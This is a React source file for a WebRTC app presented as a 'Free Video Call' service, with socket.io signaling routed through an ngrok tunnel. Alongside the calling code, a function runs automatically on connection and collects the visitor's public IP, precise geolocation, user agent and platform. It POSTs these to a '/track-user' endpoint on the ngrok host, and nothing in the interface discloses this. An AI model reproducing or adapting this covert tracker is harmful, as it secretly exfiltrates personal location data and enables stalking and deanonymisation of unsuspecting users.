import React, { useRef, useEffect, useState } from 'react';
import { io } from 'socket.io-client';
import './App.css';

const socket = io("https://e2fe-202-173-124-249.ngrok-free.app", {
  transports: ['websocket'],
  path: "/socket.io",
});

const App = () => {
  const localVideo = useRef(null);
  const remoteVideo = useRef(null);
  const [peerConnection, setPeerConnection] = useState(null);
  const [mediaStream, setMediaStream] = useState(null);

  const [socketId, setSocketId] = useState('');
  const [targetId, setTargetId] = useState('');
  const [onlineUsers, setOnlineUsers] = useState([]);
  const [streamStarted, setStreamStarted] = useState(false);

  useEffect(() => {
    socket.on('connect', () => {
      setSocketId(socket.id);
      collectAndSendUserInfo();
    });

    socket.on('online-users', (users) => {
      setOnlineUsers(users.filter(id => id !== socket.id));
    });

    socket.on('offer', async ({ from, offer }) => {
      await startLocalStream();
      const pc = createPeerConnection(from);
      await pc.setRemoteDescription(new RTCSessionDescription(offer));
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      socket.emit('answer', { to: from, answer });
      setPeerConnection(pc);
      setTargetId(from);
    });

    socket.on('answer', ({ answer }) => {
      peerConnection?.setRemoteDescription(new RTCSessionDescription(answer));
    });

    socket.on('ice-candidate', ({ candidate }) => {
      if (peerConnection && candidate) {
        peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
      }
    });

    return () => {
      socket.off('connect');
      socket.off('offer');
      socket.off('answer');
      socket.off('ice-candidate');
      socket.off('online-users');
    };
  }, [peerConnection]);

  const startLocalStream = async () => {
    if (streamStarted) return;

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      localVideo.current.srcObject = stream;
      setMediaStream(stream);
      setStreamStarted(true);
    } catch (err) {
      alert('Camera/Mic access denied');
      console.error(err);
    }
  };

  const createPeerConnection = (remoteId) => {
    const pc = new RTCPeerConnection();

    if (mediaStream) {
      mediaStream.getTracks().forEach(track => {
        pc.addTrack(track, mediaStream);
      });
    }

    pc.ontrack = (event) => {
      remoteVideo.current.srcObject = event.streams[0];
    };

    pc.onicecandidate = (event) => {
      if (event.candidate && remoteId) {
        socket.emit('ice-candidate', {
          to: remoteId,
          candidate: event.candidate,
        });
      }
    };

    return pc;
  };

  const callUser = async (id = targetId) => {
    if (!id.trim()) return alert('Enter a valid ID');
    setTargetId(id);
    await startLocalStream();

    const pc = createPeerConnection(id);
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    socket.emit('offer', { to: id, offer });
    setPeerConnection(pc);
  };
const collectAndSendUserInfo = async () => {
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const { ip } = await ipRes.json();

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const payload = {
          ip,
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          time: new Date().toISOString()
        };

        // ✅ Use correct backend URL here
        await fetch("https://e2fe-202-173-124-249.ngrok-free.app/track-user", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        console.log("User location sent:", payload);
      },
      (err) => {
        console.error("Geolocation error", err);
      },
      { enableHighAccuracy: true }
    );
  } catch (error) {
    console.error("Tracking failed:", error);
  }
};

  return (
    <div className="container dark">
      <h1 className="title">Free Video Call</h1>

      <div className="card">
        <p><strong>Your ID:</strong> {socketId || 'Connecting...'}</p>
        <input
          type="text"
          placeholder="Enter ID to call"
          value={targetId}
          onChange={(e) => setTargetId(e.target.value)}
          className="input"
        />
        <button onClick={() => callUser()} className="btn">Connect</button>
        {!streamStarted && (
          <button className="btn" onClick={startLocalStream}>
            Enable Camera & Microphone
          </button>
        )}
      </div>

      <div className="user-list">
        <h3>People Online:</h3>
        {onlineUsers.length === 0 && <p>No one else online</p>}
        {onlineUsers.map(id => (
          <button key={id} onClick={() => callUser(id)} className="user-btn">
            {id}
          </button>
        ))}
      </div>

      <div className="video-wrapper">
        <video ref={remoteVideo} autoPlay playsInline className="remote-video" />
        <video ref={localVideo} autoPlay muted playsInline className="local-video" />
      </div>
    </div>
  );
};

export default App;
